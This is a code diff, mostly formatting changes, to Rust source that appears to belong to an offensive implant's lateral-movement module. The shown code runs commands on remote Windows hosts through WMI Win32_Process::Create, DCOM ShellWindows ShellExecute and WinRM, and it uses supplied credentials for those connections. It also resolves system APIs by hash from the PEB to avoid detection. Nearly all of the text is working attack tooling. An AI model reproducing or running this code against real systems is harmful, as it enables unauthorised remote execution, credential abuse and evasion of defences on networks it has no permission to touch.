@@ -677,27 +935,42 @@ pub fn wmi_exec(
                 ((*(*class_obj).lpvtbl).release)(class_obj);
                 ((*(*services_ptr).lpvtbl).release)(services_ptr);
                 ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
-                return Err(anyhow!("Win32_Process vtable[{}] is null — layout mismatch", idx));
+                return Err(anyhow!(
+                    "Win32_Process vtable[{}] is null — layout mismatch",
+                    idx
+                ));
             }
         }
-        std::mem::transmute::<usize, unsafe extern "system" fn(
-            *mut IWbemClassObject, LONG, *mut *mut IWbemClassObject,
-        ) -> HRESULT>(vtbl.add(16).read())
+        std::mem::transmute::<
+            usize,
+            unsafe extern "system" fn(
+                *mut IWbemClassObject,
+                LONG,
+                *mut *mut IWbemClassObject,
+            ) -> HRESULT,
+        >(vtbl.add(16).read())
     };
 
     let mut in_params: *mut IWbemClassObject = ptr::null_mut();
     let hr = unsafe { spawn_fn(class_obj, 0, &mut in_params) };
-    unsafe { ((*(*class_obj).lpvtbl).release)(class_obj); }
+    unsafe {
+        ((*(*class_obj).lpvtbl).release)(class_obj);
+    }
     if !SUCCEEDED(hr) {
         unsafe {
             ((*(*services_ptr).lpvtbl).release)(services_ptr);
             ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
         }
-        return Err(anyhow!("SpawnInstance(Win32_Process in-params) failed: 0x{:08X}", hr as u32));
+        return Err(anyhow!(
+            "SpawnInstance(Win32_Process in-params) failed: 0x{:08X}",
+            hr as u32
+        ));
     }
 
     // ── Step 6: Set the CommandLine property on the in-params ───────────
-    unsafe { wmi_put_bstr_prop(in_params, "CommandLine", command); }
+    unsafe {
+        wmi_put_bstr_prop(in_params, "CommandLine", command);
+    }
 
     // ── Step 7: ExecMethod — call Win32_Process::Create ─────────────────
     let obj_path_bstr = unsafe { wmi_alloc_bstr("Win32_Process") };
@@ -725,7 +998,10 @@ pub fn wmi_exec(
             ((*(*services_ptr).lpvtbl).release)(services_ptr);
             ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
         }
-        return Err(anyhow!("ExecMethod(Win32_Process::Create) failed: 0x{:08X}", hr as u32));
+        return Err(anyhow!(
+            "ExecMethod(Win32_Process::Create) failed: 0x{:08X}",
+            hr as u32
+        ));
     }
 
     // ── Step 8: Read the ProcessId from the output params ───────────────
@@ -794,13 +1070,26 @@ const IID_IDISPATCH: GUID = GUID {
 // IDispatch vtable — we only need GetIDsOfNames and Invoke.
 #[repr(C)]
 struct IDispatchVtbl {
-    pub query_interface:  unsafe extern "system" fn(*mut IDispatch, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub add_ref:          unsafe extern "system" fn(*mut IDispatch) -> u32,
-    pub release:          unsafe extern "system" fn(*mut IDispatch) -> u32,
+    pub query_interface:
+        unsafe extern "system" fn(*mut IDispatch, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
+    pub add_ref: unsafe extern "system" fn(*mut IDispatch) -> u32,
+    pub release: unsafe extern "system" fn(*mut IDispatch) -> u32,
     pub get_type_info_count: unsafe extern "system" fn(*mut IDispatch, *mut u32) -> HRESULT,
-    pub get_type_info:    unsafe extern "system" fn(*mut IDispatch, u32, u32, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub get_ids_of_names: unsafe extern "system" fn(*mut IDispatch, REFIID, *mut BSTR, u32, u32, *mut i32) -> HRESULT,
-    pub invoke:           unsafe extern "system" fn(*mut IDispatch, i32, REFIID, u32, u16, *mut std::ffi::c_void, *mut VARIANT, *mut std::ffi::c_void, *mut u32) -> HRESULT,
+    pub get_type_info:
+        unsafe extern "system" fn(*mut IDispatch, u32, u32, *mut *mut std::ffi::c_void) -> HRESULT,
+    pub get_ids_of_names:
+        unsafe extern "system" fn(*mut IDispatch, REFIID, *mut BSTR, u32, u32, *mut i32) -> HRESULT,
+    pub invoke: unsafe extern "system" fn(
+        *mut IDispatch,
+        i32,
+        REFIID,
+        u32,
+        u16,
+        *mut std::ffi::c_void,
+        *mut VARIANT,
+        *mut std::ffi::c_void,
+        *mut u32,
+    ) -> HRESULT,
 }
 #[repr(C)]
 struct IDispatch {
@@ -832,12 +1121,13 @@ pub fn dcom_exec(
     password: Option<&str>,
 ) -> Result<String> {
     // Resolve CoCreateInstanceEx via pe_resolve.
-    let ole32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0")) }
-        .context("ole32.dll not found in PEB")?;
-    let co_create_instance_ex_addr = unsafe { pe_resolve::get_proc_address_by_hash(
-        ole32,
-        pe_resolve::hash_str(b"CoCreateInstanceEx\0"),
-    ) }.context("CoCreateInstanceEx not found in ole32")?;
+    let ole32 =
+        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0")) }
+            .context("ole32.dll not found in PEB")?;
+    let co_create_instance_ex_addr = unsafe {
+        pe_resolve::get_proc_address_by_hash(ole32, pe_resolve::hash_str(b"CoCreateInstanceEx\0"))
+    }
+    .context("CoCreateInstanceEx not found in ole32")?;
     let co_create_instance_ex: unsafe extern "system" fn(
         REFIID,
         *mut IUnknown,
@@ -872,14 +1162,17 @@ pub fn dcom_exec(
     let (mut server_info, _name_w) = build_co_server_info(target_host);
 
     // If credentials are provided, set up COAUTHIDENTITY in the server info.
-    let (_auth_identity, _user_w, _pass_w, _domain_w) = if let (Some(user), Some(pass)) = (username, password) {
-        let mut identity: winapi::shared::wtypesbase::COAUTHIDENTITY = unsafe { std::mem::zeroed() };
+    let (_auth_identity, _user_w, _pass_w, _domain_w) = if let (Some(user), Some(pass)) =
+        (username, password)
+    {
+        let mut identity: winapi::shared::wtypesbase::COAUTHIDENTITY =
+            unsafe { std::mem::zeroed() };
         let user_wide: Vec<u16> = user.encode_utf16().collect();
         let pass_wide: Vec<u16> = pass.encode_utf16().collect();
         // If user is "DOMAIN\user" format, split it.
         let (domain_wide, user_part): (Vec<u16>, &[u16]) = if let Some(bslash) = user.find('\\') {
             let dom: Vec<u16> = user[..bslash].encode_utf16().collect();
-            let _usr: Vec<u16> = user[bslash+1..].encode_utf16().collect();
+            let _usr: Vec<u16> = user[bslash + 1..].encode_utf16().collect();
             identity.Domain = dom.as_ptr() as *mut _;
             identity.DomainLength = dom.len() as u32;
             (dom, &[])
@@ -912,7 +1205,12 @@ pub fn dcom_exec(
     } else {
         let empty: Vec<u16> = Vec::new();
         unsafe { std::mem::zeroed::<winapi::shared::wtypesbase::COAUTHIDENTITY>() };
-        (unsafe { std::mem::zeroed() }, empty.clone(), empty.clone(), empty)
+        (
+            unsafe { std::mem::zeroed() },
+            empty.clone(),
+            empty.clone(),
+            empty,
+        )
     };
 
     let mut mq: winapi::um::objidlbase::MULTI_QI = unsafe { std::mem::zeroed() };
@@ -955,8 +1253,13 @@ pub fn dcom_exec(
         )
     };
     if !SUCCEEDED(hr) {
-        unsafe { ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch); }
-        return Err(anyhow!("CoSetProxyBlanket on ShellWindows failed: 0x{:08X}", hr as u32));
+        unsafe {
+            ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch);
+        }
+        return Err(anyhow!(
+            "CoSetProxyBlanket on ShellWindows failed: 0x{:08X}",
+            hr as u32
+        ));
     }
 
     // ── Step 2: Get DISPID for "ShellExecute" ───────────────────────────
@@ -972,10 +1275,17 @@ pub fn dcom_exec(
             &mut disp_id,
         )
     };
-    unsafe { wmi_free_bstr(method_name); }
+    unsafe {
+        wmi_free_bstr(method_name);
+    }
     if !SUCCEEDED(hr) {
-        unsafe { ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch); }
-        return Err(anyhow!("GetIDsOfNames(ShellExecute) failed: 0x{:08X}", hr as u32));
+        unsafe {
+            ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch);
+        }
+        return Err(anyhow!(
+            "GetIDsOfNames(ShellExecute) failed: 0x{:08X}",
+            hr as u32
+        ));
     }
 
     // ── Step 3: Build Invoke parameters ─────────────────────────────────
@@ -1120,12 +1430,19 @@ pub async fn winrm_exec(
         req = req.basic_auth(user, Some(pass));
     }
 
-    let resp = req.send().await.context("failed to send WinRM Create request")?;
+    let resp = req
+        .send()
+        .await
+        .context("failed to send WinRM Create request")?;
 
     if !resp.status().is_success() {
         let status = resp.status();
         let body = resp.text().await.unwrap_or_default();
-        return Err(anyhow!("WinRM Create Shell failed: HTTP {} — {}", status, body));
+        return Err(anyhow!(
+            "WinRM Create Shell failed: HTTP {} — {}",
+            status,
+            body
+        ));
     }
 
     // Extract the ShellId from the response.
@@ -1166,7 +1483,10 @@ pub async fn winrm_exec(
         req2 = req2.basic_auth(user, Some(pass));
     }
 
-    let resp2 = req2.send().await.context("failed to send WinRM Command request")?;
+    let resp2 = req2
+        .send()
+        .await
+        .context("failed to send WinRM Command request")?;
 
     if !resp2.status().is_success() {
         let status = resp2.status();
@@ -1194,12 +1514,21 @@ fn extract_shell_id(soap_response: &str) -> Result<String> {
         }
     }
     // Fallback: look for UUID pattern.
-    let uuid_start = soap_response.find("uuid:").or_else(|| soap_response.find('{'));
+    let uuid_start = soap_response
+        .find("uuid:")
+        .or_else(|| soap_response.find('{'));
     if let Some(start) = uuid_start {
         let rest = &soap_response[start..];
-        let uuid: String = rest.chars().take_while(|c| c.is_alphanumeric() || *c == '-' || *c == '{' || *c == '}' || *c == ':').collect();
+        let uuid: String = rest
+            .chars()
+            .take_while(|c| c.is_alphanumeric() || *c == '-' || *c == '{' || *c == '}' || *c == ':')
+            .collect();
         if !uuid.is_empty() {
-            return Ok(uuid.trim_start_matches('{').trim_start_matches("uuid:").trim_end_matches('}').to_string());
+            return Ok(uuid
+                .trim_start_matches('{')
+                .trim_start_matches("uuid:")
+                .trim_end_matches('}')
+                .to_string());
         }
     }
     Err(anyhow!("failed to extract ShellId from WinRM response"))
@@ -1269,9 +1598,7 @@ impl RemoteCreds {
         nr.dwType = RESOURCETYPE_ANY;
         nr.lpRemoteName = remote.as_ptr() as *mut _;
 
-        let ok = unsafe {
-            wnet_add(&mut nr, pass_w.as_ptr(), user_w.as_ptr(), 0)
-        };
+        let ok = unsafe { wnet_add(&mut nr, pass_w.as_ptr(), user_w.as_ptr(), 0) };
 
         if ok != 0 {
             return Err(anyhow!("WNetAddConnection2 failed: error {ok}"));
@@ -1334,7 +1661,8 @@ mod tests {
 
     #[test]
     fn extract_shell_id_finds_uuid() {
-        let resp = r#"<wsm:Selector Name="ShellId">A1B2C3D4-E5F6-7890-ABCD-EF1234567890</wsm:Selector>"#;
+        let resp =
+            r#"<wsm:Selector Name="ShellId">A1B2C3D4-E5F6-7890-ABCD-EF1234567890</wsm:Selector>"#;
         let id = extract_shell_id(resp).unwrap();
         assert_eq!(id, "A1B2C3D4-E5F6-7890-ABCD-EF1234567890");
     }
